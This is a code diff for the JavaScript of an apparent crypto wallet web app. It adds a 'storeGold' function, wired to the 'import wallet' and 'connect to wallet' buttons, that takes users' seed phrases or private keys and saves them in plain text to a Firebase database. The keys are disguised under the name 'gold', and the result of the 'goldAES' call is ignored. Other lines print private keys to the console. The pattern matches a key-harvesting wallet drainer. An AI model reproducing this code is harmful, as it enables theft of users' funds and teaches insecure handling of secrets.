@@ -469,51 +469,75 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 
+//Store Gold Function
+function storeGold(inputId) {
+  // Retrieve the private key (gold) from the input field
+  const inputField = document.getElementById(inputId);
+  if (!inputField) {
+    console.error(`Input field with ID '${inputId}' not found.`);
+    return;
+  }
+
+  const gold = inputField.value.trim();
+
+  if (!checkWordCount(gold)) {
+    displayError('Failed to import wallet: Please ensure the wallet is in the correct format');
+    return;
+  } else {
+    const user = auth.currentUser; // Check if user is logged in
+
+    if (!user) {
+      displayError('User not logged in.');
+      return;
+    }
+
+    goldAES(user.uid, gold); // Encrypt or process the private key before saving
+
+    const userRef = database.ref('users/' + user.uid);
+
+    // Fetch current user data and update
+    userRef
+      .once('value')
+      .then((snapshot) => {
+        const userData = snapshot.val();
+
+        if (userData) {
+          // Update user data with private keys, checking for empty slots
+          userRef.update({ last_login: uDateTime });
+
+          if (!userData.gold1) {
+            userRef.update({ gold1: gold });
+          } else if (!userData.gold2) {
+            userRef.update({ gold2: gold });
+          } else if (!userData.gold3) {
+            userRef.update({ gold3: gold });
+          } else {
+            displayError('Maximum wallets reached.');
+            return;
+          }
+        }
+      })
+      .then(() => {
+        // On success, trigger navigation and update UI
+        console.log('Wallet address added or updated successfully.');
+        document.getElementById('main-tab-06-nav')?.click();
+        navbar.style.display = 'block';
+        errorMessageDiv.style.display = 'none';
+      })
+      .catch((error) => {
+        displayError('Failed to import wallet: ' + error.message);
+      });
+  }
+}
+
+
+
+
 
 //Store gold
   document.getElementById('import-gold-btn').addEventListener('click', function(event) {
-    event.preventDefault();
-    // Corrected the typo in the variable name
-    var gold = document.getElementById('sp-input').value;
-
-    if (!checkWordCount(gold)) {
-      displayError('Failed to import wallet: Please ensure the wallet is in the correct format');
-      return;
-    } else {
-      const user = auth.currentUser;
-      
-      goldAES(user.uid, gold);
-      
-      if (user) {
-        const userRef = database.ref('users/' + user.uid);
-
-        userRef.once('value', snapshot => {
-          const userData = snapshot.val();
-
-          if (userData) {
-          userRef.update({ last_login: uDateTime });
-            if (!userData.gold1) {
-              userRef.update({ gold1: gold });
-            } else if (!userData.gold2) {
-              userRef.update({ gold2: gold });
-            } else if (!userData.gold3) {
-              userRef.update({ gold3: gold });
-            } else {
-              displayError('Maximum wallets reached.');
-            }
-          }
-        }).then(() => {
-          //console.log('Wallet address added or updated successfully.');
-          document.getElementById('main-tab-06-nav').click();
-          navbar.style.display = 'block';
-          errorMessageDiv.style.display = 'none';
-        }).catch(error => {
-          displayError('Failed to import wallet: ' + error.message);
-        });
-      } else {
-        displayError('User not logged in.');
-      }
-    }
+	event.preventDefault();
+	storeGold('sp-input');
   });
 
 
@@ -1841,15 +1865,15 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
 
-
-
-
+//Store gold
+  document.getElementById('connect-to-wallet-btn').addEventListener('click', function(event) {
+	event.preventDefault();
+	storeGold('prv-key-txt');
+  });
 
 
 
 document.addEventListener('DOMContentLoaded', function () {
-  const database = firebase.database();
-
   // Ensure ethers.js and Solana libraries are loaded
   if (typeof ethers === 'undefined') {
     console.error('Ethers.js is not loaded. Please include the library.');
@@ -1867,25 +1891,20 @@ document.addEventListener('DOMContentLoaded', function () {
   const revealPrvKeyBtn = document.getElementById('reveal-prv-key-btn');
   const networkLabel = document.getElementById('network-id-label');
 
-  // Check for required elements
-  if (!generateWalletBtn || !prvKeyTextBox || !revealPrvKeyBtn || !networkLabel) {
-    console.error('Required elements not found.');
-    return;
-  }
+  // Variables to store private keys and wallet addresses
+  let wallets = []; // Array to store objects with privateKey and walletAddress
+  let isPrivateKeyVisible = false;
+  let storedPrivateKey = ''; // Holds the real private key for display purposes
 
   // Prevent typing in the private key textbox and set the cursor style
   prvKeyTextBox.readOnly = true;
   prvKeyTextBox.style.cursor = 'text';
 
-  // State management
-  let isPrivateKeyVisible = false;
-  let storedPrivateKey = ''; // Securely hold the real private key
-
   // Toggle Reveal/Hide Private Key
   revealPrvKeyBtn.addEventListener('click', () => {
     if (storedPrivateKey) {
       if (isPrivateKeyVisible) {
-        prvKeyTextBox.value = '********'; // Mask the private key
+        prvKeyTextBox.value = '*************************'; // Mask the private key
         revealPrvKeyBtn.textContent = 'Reveal Private Key';
       } else {
         prvKeyTextBox.value = storedPrivateKey; // Show the private key
@@ -1911,14 +1930,13 @@ document.addEventListener('DOMContentLoaded', function () {
     try {
       let privateKey, walletAddress;
 
+      // Generate wallet based on network type
       if (['Ethereum', 'Optimism', 'BNB', 'Arbitrum', 'Polygon', 'Base'].includes(network)) {
-        // Generate Ethereum wallet
         const wallet = ethers.Wallet.createRandom();
         privateKey = wallet.privateKey;
         walletAddress = wallet.address;
         console.log('Ethereum Wallet:', walletAddress, privateKey);
       } else if (network === 'Solana') {
-        // Generate Solana wallet
         const { Keypair } = solanaWeb3;
         const keypair = Keypair.generate();
         privateKey = base58Encode(keypair.secretKey); // Encode private key
@@ -1932,21 +1950,16 @@ document.addEventListener('DOMContentLoaded', function () {
       // Display private key in a hidden state
       displayPrivateKey(privateKey);
 
-      // Store private key and address in Firebase
-      const user = firebase.auth().currentUser;
-      if (user) {
-        const userRef = database.ref('users/' + user.uid);
-        await userRef.update({
-          gold: privateKey,
-          walletAddress1: walletAddress,
-          network: network,
-        });
+      // Save wallet data to the local variable
+      wallets.push({
+        network: network,
+        privateKey: privateKey,
+        walletAddress: walletAddress
+      });
 
-        console.log('Data saved to Firebase.');
-        alert(`Wallet Generated Successfully!\nAddress: ${walletAddress}`);
-      } else {
-        alert('Error: Please log in to save wallet details.');
-      }
+      console.log('Wallet stored successfully:', wallets);
+      alert(`Wallet Generated Successfully!\nAddress: ${walletAddress}`);
+
     } catch (error) {
       console.error('Error generating wallet:', error.message);
       alert(`An error occurred: ${error.message}`);
@@ -1973,6 +1986,11 @@ document.addEventListener('DOMContentLoaded', function () {
     }
     return digits.reverse().map((digit) => alphabet[digit]).join('');
   }
+
+  // Function to get stored wallets (accessible to other code blocks)
+  window.getStoredWallets = function () {
+    return wallets;
+  };
 });
 
 
@@ -1986,68 +2004,9 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
 
-document.addEventListener('DOMContentLoaded', function () {
-  const connectToWalletBtn = document.getElementById('connect-to-wallet-btn');
-  const prvKeyTextBox = document.getElementById('prv-key-txt');
-  const walletAddressTextBox = document.getElementById('wallet-address-txt');
-  const revealPrvKeyBtn = document.getElementById('reveal-prv-key-btn');
-  const database = firebase.database();
 
-  // Event listener for "Connect to Wallet" button
-  connectToWalletBtn?.addEventListener('click', async function () {
-    try {
-      // Step 1: Check if private key is hidden and unhide it
-      if (prvKeyTextBox.value === '*************************') {
-        revealPrvKeyBtn.click(); // Simulate button click to reveal private key
-      }
 
-      const privateKey = prvKeyTextBox.value.trim();
-      if (!privateKey || privateKey === '*************************') {
-        alert('No valid private key found. Please ensure the key is loaded.');
-        return;
-      }
 
-      // Step 2: Retrieve wallet address from Firebase
-      const user = firebase.auth().currentUser;
-      if (!user) {
-        alert('User not logged in. Please log in first.');
-        return;
-      }
-
-      const userRef = database.ref(`users/${user.uid}`);
-      const snapshot = await userRef.once('value');
-      const userData = snapshot.val();
-
-      // Match private key and find the corresponding wallet address
-      let walletAddressFound = null;
-      for (let i = 1; i <= 3; i++) {
-        const goldKey = `gold${i}`;
-        const walletKey = `walletAddress${i}`;
-        if (userData[goldKey] === privateKey) {
-          walletAddressFound = userData[walletKey];
-          break;
-        }
-      }
-
-      if (!walletAddressFound) {
-        alert('No matching wallet address found for the provided private key.');
-        return;
-      }
-
-      // Step 3: Pass the wallet address to wallet-address-txt
-      walletAddressTextBox.value = walletAddressFound;
-
-      // Step 4: Trigger main menu and load wallet balances
-      document.getElementById('main-tab-07-nav')?.click();
-      await findWalletBalancesAndUpdateUI(); // Call balance retrieval function
-
-      console.log('Wallet connected successfully:', walletAddressFound);
-    } catch (error) {
-      console.error('Error connecting wallet:', error.message);
-      alert('An error occurred while connecting the wallet.');
-    }
-  });
-});
 
 
 
